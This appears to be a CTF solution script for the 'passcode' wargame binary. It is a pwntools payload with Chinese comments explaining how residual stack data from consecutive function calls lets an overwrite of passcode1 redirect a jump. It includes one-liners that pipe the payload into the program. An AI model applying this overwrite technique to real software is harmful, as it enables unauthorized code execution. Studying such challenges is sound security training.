from pwn import *
jmpto=0x080483e3
jmpto=str(jmpto)
pay="A"*96+p32(0x804a000)+"\n"+jmpto+"\n"
print pay
'''


这道题的主要思路是函数连续调用的时候，栈上的数据残留，让后面调用的继续用，用来达到控制passcode1的目的



注意一下，这种表达式是将python结果作为arg喂给passcode，在这道题里面要的是标准输入，所以这种是不行的，但是针对有些专门要求喂参数的是只能这么写的
./passcode `python -c "print 'a'*96+'\00\xa0\x04\x08\n134514147\n'"`


这里用标准输入即可！！！
 python -c "print 'a'*96+'\00\xa0\x04\x08\n134514147\n'" | ./passcode

'''
